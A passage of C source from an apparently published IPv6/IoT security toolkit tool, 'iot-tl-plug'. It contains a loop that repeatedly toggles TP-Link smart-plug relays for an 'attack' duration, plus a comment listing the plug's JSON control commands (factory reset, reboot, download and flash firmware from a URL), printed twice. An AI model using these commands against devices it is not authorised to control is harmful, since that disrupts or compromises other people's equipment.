					nsetptr= sizeof(TP_LINK_SET_RELAY_ON)-1;
					set= SET_RELAY_OFF;
				}
				else{
					setptr= TP_LINK_SET_RELAY_OFF;
					nsetptr= sizeof(TP_LINK_SET_RELAY_OFF)-1;
					set= SET_RELAY_ON;
				}

				memcpy(sendbuff, setptr, nsetptr);
				nsendbuff= nsetptr;
				tp_link_crypt((unsigned char *)sendbuff, nsendbuff);

				if( sendto(idata.fd, sendbuff, nsendbuff, 0, (struct sockaddr *) &sockaddr_to, sizeof(sockaddr_to)) == -1){
					perror("iot-tl-plug: ");
					exit(EXIT_FAILURE);
				}

				if(gettimeofday(&lastprobe, NULL) == -1){
					if(idata.verbose_f)
						perror("iot-tl-plug");

					exit(EXIT_FAILURE);
				}


				if(attack_length_f && is_time_elapsed(&curtime, &starttime, attack_length * 1000000)){
					donesending_f=TRUE;
				}


			}


			if(FD_ISSET(idata.fd, &eset)){
				if(idata.verbose_f)
					puts("iot-tl-plug: Found exception on libpcap descriptor");

				exit(EXIT_FAILURE);
			}
		}

		exit(EXIT_SUCCESS);
	}


	exit(EXIT_SUCCESS);
}




/*
 * Function: match_strings()
 *
 * Checks whether one string "matches" within another string
 */

int match_strings(char *buscar, char *buffer){
	unsigned int buscars, buffers;
	unsigned int i=0, j=0;

	buscars= Strnlen(buscar, MAX_IEEE_OUIS_LINE_SIZE);
	buffers= Strnlen(buffer, MAX_IEEE_OUIS_LINE_SIZE);

	if(buscars > buffers)
		return(0);

	while(i <= (buffers - buscars)){
		j=0;

		while(j < buscars){
			if(toupper((int) ((unsigned char)buscar[j])) != toupper((int) ((unsigned char)buffer[i+j])))
				break;

			j++;
		}

		if(j >= buscars)
			return(1);

		i++;
	}

	return(0);
}





/*
 * Function: usage()
 *
 * Prints the syntax of the iot-tl-plug tool
 */

void usage(void){
	puts("usage: iot-tl-plug (-L | -d) [-i INTERFACE] [-v] [-h]");
}


/*
 * Function: print_help()
 *
 * Prints help information for the iot-tl-plug tool
 */

void print_help(void){
	puts(SI6_TOOLKIT);
	puts( "iot-tl-plug: An IoT scanning tool\n");
	usage();
    
	puts("\nOPTIONS:\n"
	     "  --interface, -i             Network interface\n"
	     "  --dst-address, -d           IPv6 Destination Range or Prefix\n"
	     "  --retrans, -x               Number of retransmissions of each probe\n"
	     "  --timeout, -O               Timeout in seconds (default: 1 second)\n"
	     "  --local-scan, -L            Scan the local subnet\n"
	     "  --help, -h                  Print help for the iot-tl-plug tool\n"
	     "  --verbose, -v               Be verbose\n"
	     "\n"
	     " Programmed by Fernando Gont for SI6 Networks <http://www.si6networks.com>\n"
	     " Please send any bug reports to <fgont@si6networks.com>\n"
	);
}



/*
 * Function: print_host_entries()
 *
 * Prints the IPv6 addresses (and optionally the Ethernet addresses) in a list
 */

int print_host_entries(struct host_list *hlist, unsigned char flag){
	unsigned int i;

	for(i=0; i < (hlist->nhosts); i++){
		if(inet_ntop(AF_INET6, &((hlist->host[i])->ip6), pv6addr, sizeof(pv6addr)) == NULL){
			if(verbose_f>1)
				puts("inet_ntop(): Error converting IPv6 address to presentation format");

			return(-1);
		}

		if(flag == PRINT_ETHER_ADDR){
			if(ether_ntop( &((hlist->host[i])->ether), plinkaddr, sizeof(plinkaddr)) == 0){
				if(verbose_f>1)
					puts("ether_ntop(): Error converting address");

				return(-1);
			}

			printf("%s @ %s\n", pv6addr, plinkaddr);
		}
		else
			printf("%s\n", pv6addr);
	}

	return 0;
}



/*
 * Function: print_unique_host_entries()
 *
 * Prints only one IPv6 address (and optionally the Ethernet addresses) per Ethernet 
 * address in a list.
 */

int print_unique_host_entries(struct host_list *hlist, unsigned char flag){
	unsigned int i, j, k;

	for(i=0; i < (hlist->nhosts); i++){

		if(i){
			for(j=0; j < i; j++){
				for(k=0; k < ETH_ALEN; k++){
					if((hlist->host[i])->ether.a[k] != (hlist->host[j])->ether.a[k])
						break;
				}

				if(k == ETH_ALEN)
					break;
			}			

			if(j < i)
				continue;
		}
			
		if(inet_ntop(AF_INET6, &((hlist->host[i])->ip6), pv6addr, sizeof(pv6addr)) == NULL){
			if(verbose_f>1)
				puts("inet_ntop(): Error converting IPv6 address to presentation format");

			return(-1);
		}

		if(flag == PRINT_ETHER_ADDR){
			if(ether_ntop( &((hlist->host[i])->ether), plinkaddr, sizeof(plinkaddr)) == 0){
				if(verbose_f>1)
					puts("ether_ntop(): Error converting address");

				return(-1);
			}

			printf("%s @ %s\n", pv6addr, plinkaddr);
		}
		else
			printf("%s\n", pv6addr);
	}

	return 0;
}



/*
 * Function: free_host_entries()
 *
 * Releases memory allocated for holding IPv6 addresses and Ethernet addresses
 */

void free_host_entries(struct host_list *hlist){
	unsigned int i;

	for(i=0; i< hlist->nhosts; i++)
		free(hlist->host[i]);

	hlist->nhosts=0;	/* Set the number of entries to 0, to reflect the released memory */
	return;
}




/*
 * Function: is_command_valid()
 *
 * hecks whether the specified command existsReleases memory allocated for holding IPv6 addresses and Ethernet addresses
 */

unsigned int is_command_valid(char *command){
	unsigned int i=0;

	while(commands[i] != NULL){
		if( strncmp(commands[i], command, MAX_TP_COMMAND_LENGTH) == 0)
			return(TRUE);

		i++;
	}

	return(FALSE);
}

/*
{"system":{"reboot":{"delay":1}}}

Reset (To Factory Settings)
{"system":{"reset":{"delay":1}}}

Turn On
{"system":{"set_relay_state":{"state":1}}}

Turn Off
{"system":{"set_relay_state":{"state":0}}}

Turn Off Device LED (Night mode)
{"system":{"set_led_off":{"off":1}}}

Set Device Alias
{"system":{"set_dev_alias":{"alias":"supercool plug"}}}

Set MAC Address
{"system":{"set_mac_addr":{"mac":"50-C7-BF-01-02-03"}}}

Set Device ID
{"system":{"set_device_id":{"deviceId":"0123456789ABCDEF0123456789ABCDEF01234567"}}}

Set Hardware ID
{"system":{"set_hw_id":{"hwId":"0123456789ABCDEF0123456789ABCDEF"}}}

Set Location
{"system":{"set_dev_location":{"longitude":6.9582814,"latitude":50.9412784}}}

Perform uBoot Bootloader Check
{"system":{"test_check_uboot":null}}

Get Device Icon
{"system":{"get_dev_icon":null}}

Set Device Icon
{"system":{"set_dev_icon":{"icon":"xxxx","hash":"ABCD"}}}

Set Test Mode (command only accepted coming from IP 192.168.1.100)
{"system":{"set_test_mode":{"enable":1}}}

Download Firmware from URL
{"system":{"download_firmware":{"url":"http://...."}}}

Get Download State
{"system":{"get_download_state":{}}}

Flash Downloaded Firmware
{"system":{"flash_firmware":{}}}

Check Config
{"system":{"check_new_config":null}}Reboot
{"system":{"reboot":{"delay":1}}}

Reset (To Factory Settings)
{"system":{"reset":{"delay":1}}}

Turn On
{"system":{"set_relay_state":{"state":1}}}

Turn Off
{"system":{"set_relay_state":{"state":0}}}

Turn Off Device LED (Night mode)
{"system":{"set_led_off":{"off":1}}}

Set Device Alias
{"system":{"set_dev_alias":{"alias":"supercool plug"}}}

Set MAC Address
{"system":{"set_mac_addr":{"mac":"50-C7-BF-01-02-03"}}}

Set Device ID
{"system":{"set_device_id":{"deviceId":"0123456789ABCDEF0123456789ABCDEF01234567"}}}

Set Hardware ID
{"system":{"set_hw_id":{"hwId":"0123456789ABCDEF0123456789ABCDEF"}}}

Set Location
{"system":{"set_dev_location":{"longitude":6.9582814,"latitude":50.9412784}}}

Perform uBoot Bootloader Check
{"system":{"test_check_uboot":null}}

Get Device Icon
{"system":{"get_dev_icon":null}}

Set Device Icon
{"system":{"set_dev_icon":{"icon":"xxxx","hash":"ABCD"}}}

Set Test Mode (command only accepted coming from IP 192.168.1.100)
{"system":{"set_test_mode":{"enable":1}}}

Download Firmware from URL
{"system":{"download_firmware":{"url":"http://...."}}}

Get Download State
{"system":{"get_download_state":{}}}

Flash Downloaded Firmware
{"system":{"flash_firmware":{}}}

Check Config
{"system":{"check_new_config":null}}	

}

*/
